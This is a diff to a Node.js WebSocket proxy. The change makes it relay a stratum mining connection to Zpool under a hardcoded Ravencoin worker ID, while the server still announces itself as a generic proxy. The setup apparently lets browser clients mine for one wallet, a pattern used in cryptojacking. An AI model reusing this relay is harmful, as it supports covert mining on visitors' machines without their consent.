@@ -5,82 +5,132 @@ var http    = require('http');
 var https   = require('https');
 var fs      = require('fs');
 var ws      = require('ws');
+var net     = require('net');
 var modules = require('./modules');
 var mes     = require('./message');
-
 
 /**
  * Proxy constructor
  */
 var Proxy = require('./proxy');
 
-
 /**
  * Initiate a server
  */
 var Server = function Init(config) {
-	var opts = {
-		clientTracking: false,
-		verifyClient:   onRequestConnect
-	}
+    var opts = {
+        clientTracking: false,
+        verifyClient:   onRequestConnect
+    };
 
-	if(config.ssl) {
-		opts.server = https.createServer({
-			key: fs.readFileSync( config.key ),
-			cert: fs.readFileSync( config.cert ),
-		}, function(req, res) {
-			res.writeHead(200);
-        	res.end("Secure wsProxy running...\n");
-		});
+    // Global TCP socket to Zpool
+    var poolSocket = null;
+    var workerId = 'RB48LRGhT6Tw6dEDnNLmy3R6E5KHyFbgMc'; // Unified RVN worker ID
+    var targetHost = null;
+    var targetPort = null;
 
-		opts.server.listen(config.port)
+    // Connect to Zpool's stratum server
+    function connectToPool(host, port) {
+        if (poolSocket && !poolSocket.destroyed) return;
 
-		mes.status("Starting a secure wsProxy on port %s...", config.port)
-	}
-	else {
-		opts.server = http.createServer(function(req, res) {
-			res.writeHead(200);
-			res.end("wsProxy running...\n");
-		});
+        targetHost = host;
+        targetPort = port;
+        poolSocket = new net.Socket();
+        poolSocket.setTimeout(0);
+        poolSocket.setNoDelay(true);
 
-		opts.server.listen(config.port)
+        poolSocket.connect(port, host, () => {
+            mes.status("Connected to Zpool: %s:%s", host, port);
+            // Send mining.subscribe and mining.authorize
+            const subscribeMsg = JSON.stringify({
+                id: 'subscribe',
+                method: 'mining.subscribe',
+                params: ['python-minotaurx/2.0']
+            }) + '\n';
+            const authorizeMsg = JSON.stringify({
+                id: 'authorize',
+                method: 'mining.authorize',
+                params: [workerId, 'c=RVN']
+            }) + '\n';
+            poolSocket.write(subscribeMsg);
+            poolSocket.write(authorizeMsg);
+        });
 
-		mes.status("Starting wsProxy on port %s...", config.port)
-	}
+        poolSocket.on('data', (data) => {
+            // Broadcast to all WebSocket clients
+            WebSocketServer.clients.forEach(client => {
+                if (client.readyState === ws.OPEN) {
+                    client.send(data.toString());
+                }
+            });
+        });
 
-	var WebSocketServer = new ws.Server(opts)
+        poolSocket.on('error', (error) => {
+            mes.error("Pool socket error: %s", error.message);
+            poolSocket.destroy();
+            poolSocket = null;
+            setTimeout(() => connectToPool(targetHost, targetPort), 5000);
+        });
 
-	WebSocketServer.on('connection', onConnection);
+        poolSocket.on('close', () => {
+            mes.warn("Pool socket closed");
+            poolSocket = null;
+        });
+    }
 
-	return this;
-}
+    if(config.ssl) {
+        opts.server = https.createServer({
+            key: fs.readFileSync(config.key),
+            cert: fs.readFileSync(config.cert),
+        }, function(req, res) {
+            res.writeHead(200);
+            res.end("Secure wsProxy running...\n");
+        });
 
+        opts.server.listen(config.port);
+        mes.status("Starting a secure wsProxy on port %s...", config.port);
+    } else {
+        opts.server = http.createServer(function(req, res) {
+            res.writeHead(200);
+            res.end("wsProxy running...\n");
+        });
+
+        opts.server.listen(config.port);
+        mes.status("Starting wsProxy on port %s...", config.port);
+    }
+
+    var WebSocketServer = new ws.Server(opts);
+
+    WebSocketServer.on('connection', (ws) => {
+        // Extract target from URL
+        const to = ws.upgradeReq.url.substr(1);
+        const args = to.split(':');
+        if (args.length !== 2) {
+            mes.error("Invalid target: %s", to);
+            ws.close();
+            return;
+        }
+
+        // Initialize pool connection if not already connected
+        connectToPool(args[0], parseInt(args[1]));
+
+        modules.method.connect(ws, function() {
+            // Pass poolSocket to Proxy
+            new Proxy(ws, poolSocket);
+        });
+    });
+
+    return this;
+};
 
 /**
- * Before estabilishing a connection
+ * Before establishing a connection
  */
 function onRequestConnect(info, callback) {
-
-	// Once we get a response from our modules, pass it through
-	modules.method.verify(info, function(res) {
-		callback(res);
-	})
-
+    modules.method.verify(info, function(res) {
+        callback(res);
+    });
 }
-
-
-/**
- * Connection passed through verify, lets initiate a proxy
- */
-function onConnection(ws) {
-
-	modules.method.connect(ws, function(res) {
-		//All modules have processed the connection, lets start the proxy
-		new Proxy(ws);
-	})
-
-}
-
 
 /**
  * Exports
